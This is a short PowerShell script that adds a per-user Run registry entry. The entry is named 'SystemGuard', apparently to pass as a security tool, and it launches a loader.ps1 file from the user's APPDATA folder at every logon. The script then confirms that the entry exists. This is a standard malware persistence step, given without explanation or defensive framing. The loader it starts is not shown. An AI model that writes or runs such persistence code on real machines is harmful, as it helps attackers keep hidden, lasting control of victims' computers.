[CmdletBinding()]
param(
    [string]$PersistencePath = "$env:APPDATA\loader.ps1",
    [string]$RegistryValue = 'SystemGuard'
)
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RegistryValue -Value $PersistencePath -PropertyType String -Force
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegistryValue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
